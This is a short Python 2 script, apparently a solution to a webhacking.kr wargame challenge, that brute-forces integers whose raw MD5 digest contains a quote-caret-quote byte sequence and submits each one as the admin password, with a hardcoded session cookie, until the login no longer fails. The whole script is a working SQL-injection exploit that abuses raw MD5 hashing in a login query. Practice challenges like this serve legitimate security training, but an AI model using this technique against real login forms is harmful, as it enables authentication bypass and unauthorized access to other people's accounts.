import urllib
import httplib
import hashlib

for i in range(1000000,99999999):
    if "'^'" in hashlib.md5(str(i)).digest():
        print str(i) + " -> " + hashlib.md5(str(i)).hexdigest()

        HTTP=httplib.HTTPConnection("webhacking.kr")
        Param="id=admin&pw="+str(i)
        Headers={"Content-Type":"application/x-www-form-urlencoded",
                 "Cookie":"PHPSESSID=bc4730b877a0174a3eef0f693c329912;"}
        HTTP.request("POST","/challenge/bonus/bonus-13/index.php",Param,Headers)
        Result=HTTP.getresponse().read()
        if not "Wrong" in Result:
            print Result
            break
